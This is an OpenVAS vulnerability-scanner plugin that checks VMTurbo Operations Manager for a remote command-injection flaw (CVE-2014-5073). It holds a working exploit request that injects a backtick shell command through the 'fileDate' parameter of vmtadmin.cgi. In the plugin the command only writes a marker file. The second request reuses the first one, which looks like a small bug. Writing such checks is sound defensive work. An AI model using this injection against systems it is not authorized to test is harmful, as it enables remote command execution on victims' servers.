###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vmturbo_operations_manager_69225.nasl 6756 2017-07-18 13:31:14Z cfischer $
#
# VMTurbo Operations Manager '/cgi-bin/vmtadmin.cgi' Remote Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:vmturbo:operations_manager";

tag_insight = 'Input passed via the "fileDate" GET parameter to /cgi-bin/vmtadmin.cgi
(when "callType" is set to "DOWN" and "actionType" is set to  "GETBRAND", "GETINTEGRATE",
"FULLBACKUP", "CFGBACKUP", "EXPORTBACKUP", "EXPERTDIAGS", or "EXPORTDIAGS") is not 
properly sanitised before being used to execute commands. This can be exploited to inject
and execute arbitrary shell commands with privileges of the "wwwrun" user.';

tag_impact = "An attacker may leverage this issue to execute arbitrary OS commands
in the context of the affected application.";

tag_affected = "VMTurbo Operations Manager 4.6 and prior are vulnerable.";

tag_summary = "VMTurbo Operations Manager is prone to a remote command-execution
vulnerability.";

tag_solution = "Update to VMTurbo Operations Manager >= 4.6-28657.";

tag_vuldetect = "Send two special crafted HTTP GET requests and check the response.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.105067");
 script_bugtraq_id(69225);
 script_cve_id("CVE-2014-5073");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_version ("$Revision: 6756 $");

 script_name("VMTurbo Operations Manager '/cgi-bin/vmtadmin.cgi' Remote Command Execution Vulnerability");


 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/69225");
 script_xref(name:"URL", value:"http://secunia.com/secunia_research/2014-8/");
 
 script_tag(name:"last_modification", value:"$Date: 2017-07-18 15:31:14 +0200 (Tue, 18 Jul 2017) $");
 script_tag(name:"creation_date", value:"2014-08-18 14:14:43 +0200 (Mon, 18 Aug 2014)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("gb_vmturbo_operations_manager_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("vmturbo/installed");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );

rand = 'OpenVAS_' + rand();
cmd = 'echo%20' + rand + '%20>%20/tmp/vmtbackup.zip';
url = '/cgi-bin/vmtadmin.cgi?callType=DOWN&actionType=CFGBACKUP&fileDate="`' + cmd + '`"';

req = http_get( item:url, port:port );

http_send_recv( port:port, data:req, bodyonly:FALSE ); # execute cmd

url = '/cgi-bin/vmtadmin.cgi?callType=DOWN&actionType=CFGBACKUP';
buf = http_send_recv( port:port, data:req, bodyonly:FALSE ); # read result

if( buf =~ 'HTTP/1.. 200' && egrep( pattern:rand, string:buf ) )
{
  security_message( port:port );
  exit( 0 );
}

exit( 0 );

